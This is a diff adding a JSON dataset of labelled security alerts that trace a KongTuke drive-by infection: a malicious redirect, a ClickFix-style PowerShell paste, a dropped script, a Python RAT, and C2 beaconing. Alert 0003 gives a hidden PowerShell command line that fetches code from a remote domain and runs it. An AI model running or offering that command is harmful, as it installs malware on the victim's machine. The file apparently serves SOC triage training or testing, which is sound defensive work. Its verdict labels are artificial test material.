@@ -1,0 +1,989 @@
+[
+  {
+    "alert_id": "alert-20260915-0001",
+    "schema_version": "1.0",
+    "timestamp": "2026-06-08T13:00:00Z",
+    "ingested_at": "2026-06-08T13:04:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "web"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "medium",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Network: Suspicious Redirect to Known Malicious Domain",
+      "description": "Browser redirected to wowlowski.icu.",
+      "severity": "medium",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1189"
+      ]
+    },
+    "alert": {
+      "title": "Network: Suspicious Redirect to Known Malicious Domain",
+      "summary": "User browsed a compromised WordPress site and was redirected to wowlowski.icu.",
+      "status": "new",
+      "confidence": 0.7,
+      "risk_score": 85,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "network:proxy",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "PRX-GW-01",
+      "type": "gateway"
+    },
+    "actor": {
+      "user": {
+        "name": "kthomas"
+      },
+      "process": {
+        "name": "chrome.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:proxy",
+      "incident_id": "INC-2026-9900",
+      "correlation_id": "corr-kongtuke-alert-20260915-0001",
+      "host_risk": 44,
+      "user_risk": 32,
+      "asset_criticality": "Medium",
+      "attack_stage": "initial-access",
+      "kill_chain_phase": "Delivery"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1189",
+        "name": "Drive-by Compromise"
+      }
+    },
+    "evidence": [
+      {
+        "type": "network_connection",
+        "data": {
+          "dst_hostname": "wowlowski.icu"
+        }
+      }
+    ],
+    "network": {
+      "src_ip": "10.10.3.50",
+      "dst_ip": "51.83.161.87",
+      "dst_port": 443,
+      "dst_hostname": "wowlowski.icu"
+    },
+    "knowledge_base": "Network: Suspicious Redirect to Known Malicious Domain"
+  },
+  {
+    "alert_id": "alert-20260915-0002",
+    "schema_version": "1.0",
+    "timestamp": "2026-06-08T13:02:00Z",
+    "ingested_at": "2026-06-08T13:04:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "discovery"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "low",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Network: Internal IP Sweep",
+      "description": "Ping sweep detected on internal subnet.",
+      "severity": "low",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Network: Internal IP Sweep",
+      "summary": "Ping sweep detected on internal subnet.",
+      "status": "new",
+      "confidence": 0.33,
+      "risk_score": 36,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-INTERNAL",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "SYSTEM"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-9900",
+      "correlation_id": "corr-kongtuke-alert-20260915-0002",
+      "host_risk": 76,
+      "user_risk": 53,
+      "asset_criticality": "Medium"
+    },
+    "knowledge_base": "Authorized scan, verified with IT team."
+  },
+  {
+    "alert_id": "alert-20260915-0003",
+    "schema_version": "1.0",
+    "timestamp": "2026-06-08T13:07:00Z",
+    "ingested_at": "2026-06-08T13:11:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process",
+        "execution"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Execution: Suspicious PowerShell from Clipboard or Run Dialog",
+      "description": "PowerShell spawned with hidden window and encoded command.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1059.001"
+      ]
+    },
+    "alert": {
+      "title": "Execution: Suspicious PowerShell from Clipboard or Run Dialog",
+      "summary": "User pasted malicious PowerShell command into Run dialog.",
+      "status": "new",
+      "confidence": 0.72,
+      "risk_score": 100,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-KTHOMAS",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "kthomas"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "command_line": "powershell -W Hidden -nop -ep bypass -c \"iex (iwr -useb https://aura-checkpoint.top/o)\""
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-9900",
+      "correlation_id": "corr-kongtuke-alert-20260915-0003",
+      "host_risk": 32,
+      "user_risk": 50,
+      "asset_criticality": "Medium",
+      "attack_stage": "execution",
+      "kill_chain_phase": "Execution"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "process_name": "powershell.exe"
+        }
+      }
+    ],
+    "knowledge_base": "Execution: Suspicious PowerShell from Clipboard or Run Dialog - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260915-0004",
+    "schema_version": "1.0",
+    "timestamp": "2026-06-08T13:08:00Z",
+    "ingested_at": "2026-06-08T13:10:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process",
+        "defense_evasion"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Execution: YARA Match Sus_CMD_Powershell_Usage",
+      "description": "YARA rule Sus_CMD_Powershell_Usage triggered on process.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1059.001"
+      ]
+    },
+    "alert": {
+      "title": "Execution: YARA Match Sus_CMD_Powershell_Usage",
+      "summary": "Obfuscated powershell command matched YARA.",
+      "status": "new",
+      "confidence": 0.75,
+      "risk_score": 99,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-KTHOMAS",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "kthomas"
+      },
+      "process": {
+        "name": "powershell.exe"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-9900",
+      "correlation_id": "corr-kongtuke-alert-20260915-0004",
+      "host_risk": 33,
+      "user_risk": 60,
+      "asset_criticality": "Medium",
+      "attack_stage": "defense-evasion",
+      "kill_chain_phase": "Execution"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell"
+      }
+    },
+    "evidence": [
+      {
+        "type": "yara_match",
+        "data": {
+          "rule_name": "Sus_CMD_Powershell_Usage"
+        }
+      }
+    ],
+    "knowledge_base": "Execution: YARA Match Sus_CMD_Powershell_Usage - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260915-0005",
+    "schema_version": "1.0",
+    "timestamp": "2026-06-08T13:09:00Z",
+    "ingested_at": "2026-06-08T13:10:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "file",
+        "malware"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "File: Known Malicious Script Dropped",
+      "description": "PowerShell script matching hash 3ba5e5ee550ae3c50554f30fc6a1feaad9b29073c851cad57fd4d2be2f0cedb6 dropped.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1105"
+      ]
+    },
+    "alert": {
+      "title": "File: Known Malicious Script Dropped",
+      "summary": "Malicious .ps1 file downloaded to temp.",
+      "status": "new",
+      "confidence": 0.93,
+      "risk_score": 98,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-KTHOMAS",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "kthomas"
+      },
+      "process": {
+        "name": "powershell.exe"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-9900",
+      "correlation_id": "corr-kongtuke-alert-20260915-0005",
+      "host_risk": 89,
+      "user_risk": 76,
+      "asset_criticality": "Medium",
+      "attack_stage": "execution",
+      "kill_chain_phase": "Delivery"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer"
+      }
+    },
+    "evidence": [
+      {
+        "type": "file_creation",
+        "data": {
+          "file_path": "C:\\Users\\kthomas\\AppData\\Local\\Temp\\o.ps1",
+          "file_hash": "3ba5e5ee550ae3c50554f30fc6a1feaad9b29073c851cad57fd4d2be2f0cedb6"
+        }
+      }
+    ],
+    "additional_context": "The powershell command downloaded the payload. Hash: 3ba5e5ee550ae3c50554f30fc6a1feaad9b29073c851cad57fd4d2be2f0cedb6.",
+    "knowledge_base": "File: Known Malicious Script Dropped"
+  },
+  {
+    "alert_id": "alert-20260915-0006",
+    "schema_version": "1.0",
+    "timestamp": "2026-06-08T13:10:00Z",
+    "ingested_at": "2026-06-08T13:11:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "authentication"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "low",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Authentication: Multiple Failed Logins",
+      "description": "Failed logins observed.",
+      "severity": "low",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Authentication: Multiple Failed Logins",
+      "summary": "Failed logins observed.",
+      "status": "new",
+      "confidence": 0.55,
+      "risk_score": 36,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "windows:security",
+      "vendor": "Unknown",
+      "module": "windows"
+    },
+    "observer": {
+      "name": "DC-01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "jsmith"
+      },
+      "process": {
+        "name": "lsass.exe"
+      }
+    },
+    "context": {
+      "raw_source": "windows:security",
+      "incident_id": "INC-2026-9900",
+      "correlation_id": "corr-kongtuke-alert-20260915-0006",
+      "host_risk": 54,
+      "user_risk": 56,
+      "asset_criticality": "Medium"
+    },
+    "knowledge_base": "Expected user activity, verified with the user."
+  },
+  {
+    "alert_id": "alert-20260915-0007",
+    "schema_version": "1.0",
+    "timestamp": "2026-06-08T13:12:00Z",
+    "ingested_at": "2026-06-08T13:15:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "file",
+        "persistence"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "File: Portable Python Dropped in AppData",
+      "description": "Suspicious portable Python environment created in Roaming.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1027"
+      ]
+    },
+    "alert": {
+      "title": "File: Portable Python Dropped in AppData",
+      "summary": "WPy64 folder created in AppData\\Roaming.",
+      "status": "new",
+      "confidence": 0.65,
+      "risk_score": 94,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-KTHOMAS",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "kthomas"
+      },
+      "process": {
+        "name": "powershell.exe"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-9900",
+      "correlation_id": "corr-kongtuke-alert-20260915-0007",
+      "host_risk": 69,
+      "user_risk": 55,
+      "asset_criticality": "Medium",
+      "attack_stage": "persistence",
+      "kill_chain_phase": "Installation"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1027",
+        "name": "Obfuscated Files or Information"
+      }
+    },
+    "evidence": [
+      {
+        "type": "file_creation",
+        "data": {
+          "file_path": "C:\\Users\\kthomas\\AppData\\Roaming\\WPy64-39\\pythonw.exe"
+        }
+      }
+    ],
+    "knowledge_base": "File: Portable Python Dropped in AppData - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260915-0008",
+    "schema_version": "1.0",
+    "timestamp": "2026-06-08T13:14:00Z",
+    "ingested_at": "2026-06-08T13:15:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process",
+        "c2"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Execution: Python Executing from AppData",
+      "description": "pythonw.exe executed from Roaming directory.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1059.006"
+      ]
+    },
+    "alert": {
+      "title": "Execution: Python Executing from AppData",
+      "summary": "ModeloRAT executed via portable python.",
+      "status": "new",
+      "confidence": 0.84,
+      "risk_score": 74,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-KTHOMAS",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "kthomas"
+      },
+      "process": {
+        "name": "pythonw.exe",
+        "command_line": "pythonw.exe C:\\Users\\kthomas\\AppData\\Roaming\\WPy64-39\\client.py"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-9900",
+      "correlation_id": "corr-kongtuke-alert-20260915-0008",
+      "host_risk": 78,
+      "user_risk": 83,
+      "asset_criticality": "Medium",
+      "attack_stage": "execution",
+      "kill_chain_phase": "Execution"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1059.006",
+        "name": "Command and Scripting Interpreter: Python"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "process_name": "pythonw.exe"
+        }
+      }
+    ],
+    "additional_context": "ModeloRAT launched in the background via pythonw.exe.",
+    "knowledge_base": "Execution: Python Executing from AppData - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260915-0009",
+    "schema_version": "1.0",
+    "timestamp": "2026-06-08T13:15:00Z",
+    "ingested_at": "2026-06-08T13:17:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "low",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Execution: Suspicious Ping",
+      "description": "Ping to 8.8.8.8.",
+      "severity": "low",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Execution: Suspicious Ping",
+      "summary": "Ping to 8.8.8.8.",
+      "status": "new",
+      "confidence": 0.69,
+      "risk_score": 38,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "SRV-WEB01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "SYSTEM"
+      },
+      "process": {
+        "name": "ping.exe"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-9900",
+      "correlation_id": "corr-kongtuke-alert-20260915-0009",
+      "host_risk": 76,
+      "user_risk": 76,
+      "asset_criticality": "Medium"
+    },
+    "knowledge_base": "Legitimate activity, verified with the relevant team."
+  },
+  {
+    "alert_id": "alert-20260915-0010",
+    "schema_version": "1.0",
+    "timestamp": "2026-06-08T13:20:00Z",
+    "ingested_at": "2026-06-08T13:22:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "c2"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "C2: Suspicious Beaconing to Known KongTuke C2",
+      "description": "Python process connecting to 46.225.231.170.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1071.001"
+      ]
+    },
+    "alert": {
+      "title": "C2: Suspicious Beaconing to Known KongTuke C2",
+      "summary": "ModeloRAT beaconing to 46.225.231.170.",
+      "status": "new",
+      "confidence": 0.74,
+      "risk_score": 84,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-EDGE-01",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "kthomas"
+      },
+      "process": {
+        "name": "pythonw.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-9900",
+      "correlation_id": "corr-kongtuke-alert-20260915-0010",
+      "host_risk": 86,
+      "user_risk": 51,
+      "asset_criticality": "Medium",
+      "attack_stage": "command-and-control",
+      "kill_chain_phase": "Command and Control"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols"
+      }
+    },
+    "evidence": [
+      {
+        "type": "network_connection",
+        "data": {
+          "dst_ip": "46.225.231.170"
+        }
+      }
+    ],
+    "network": {
+      "src_ip": "10.10.3.50",
+      "dst_ip": "46.225.231.170",
+      "dst_port": 443
+    },
+    "additional_context": "Python RAT established C2 channel with known KongTuke infrastructure at 46.225.231.170.",
+    "knowledge_base": "C2: Suspicious Beaconing to Known KongTuke C2"
+  },
+  {
+    "alert_id": "alert-20260915-0011",
+    "schema_version": "1.0",
+    "timestamp": "2026-06-08T13:25:00Z",
+    "ingested_at": "2026-06-08T13:26:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "c2"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "C2: Continued Beaconing",
+      "description": "Periodic connections to 46.225.231.170.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1071.001"
+      ]
+    },
+    "alert": {
+      "title": "C2: Continued Beaconing",
+      "summary": "Beaconing to 46.225.231.170.",
+      "status": "new",
+      "confidence": 0.77,
+      "risk_score": 74,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-EDGE-01",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "kthomas"
+      },
+      "process": {
+        "name": "pythonw.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-9900",
+      "correlation_id": "corr-kongtuke-alert-20260915-0011",
+      "host_risk": 75,
+      "user_risk": 69,
+      "asset_criticality": "Medium",
+      "attack_stage": "command-and-control",
+      "kill_chain_phase": "Command and Control"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols"
+      }
+    },
+    "evidence": [
+      {
+        "type": "network_connection",
+        "data": {
+          "dst_ip": "46.225.231.170"
+        }
+      }
+    ],
+    "network": {
+      "src_ip": "10.10.3.50",
+      "dst_ip": "46.225.231.170",
+      "dst_port": 443
+    },
+    "knowledge_base": "C2: Continued Beaconing"
+  },
+  {
+    "alert_id": "alert-20260915-0012",
+    "schema_version": "1.0",
+    "timestamp": "2026-06-08T13:30:00Z",
+    "ingested_at": "2026-06-08T13:31:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "c2"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "C2: Continued Beaconing",
+      "description": "Periodic connections to 46.225.231.170.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1071.001"
+      ]
+    },
+    "alert": {
+      "title": "C2: Continued Beaconing",
+      "summary": "Beaconing to 46.225.231.170.",
+      "status": "new",
+      "confidence": 0.91,
+      "risk_score": 97,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-EDGE-01",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "kthomas"
+      },
+      "process": {
+        "name": "pythonw.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-9900",
+      "correlation_id": "corr-kongtuke-alert-20260915-0012",
+      "host_risk": 34,
+      "user_risk": 66,
+      "asset_criticality": "Medium",
+      "attack_stage": "command-and-control",
+      "kill_chain_phase": "Command and Control"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols"
+      }
+    },
+    "evidence": [
+      {
+        "type": "network_connection",
+        "data": {
+          "dst_ip": "46.225.231.170"
+        }
+      }
+    ],
+    "network": {
+      "src_ip": "10.10.3.50",
+      "dst_ip": "46.225.231.170",
+      "dst_port": 443
+    },
+    "knowledge_base": "C2: Continued Beaconing"
+  },
+  {
+    "alert_id": "alert-20260915-0013",
+    "schema_version": "1.0",
+    "timestamp": "2026-06-08T13:35:00Z",
+    "ingested_at": "2026-06-08T13:39:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "c2"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "C2: Continued Beaconing",
+      "description": "Periodic connections to 46.225.231.170.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1071.001"
+      ]
+    },
+    "alert": {
+      "title": "C2: Continued Beaconing",
+      "summary": "Beaconing to 46.225.231.170.",
+      "status": "new",
+      "confidence": 0.66,
+      "risk_score": 88,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-EDGE-01",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "kthomas"
+      },
+      "process": {
+        "name": "pythonw.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-9900",
+      "correlation_id": "corr-kongtuke-alert-20260915-0013",
+      "host_risk": 86,
+      "user_risk": 76,
+      "asset_criticality": "Medium",
+      "attack_stage": "command-and-control",
+      "kill_chain_phase": "Command and Control"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols"
+      }
+    },
+    "evidence": [
+      {
+        "type": "network_connection",
+        "data": {
+          "dst_ip": "46.225.231.170"
+        }
+      }
+    ],
+    "network": {
+      "src_ip": "10.10.3.50",
+      "dst_ip": "46.225.231.170",
+      "dst_port": 443
+    },
+    "knowledge_base": "C2: Continued Beaconing"
+  }
+]
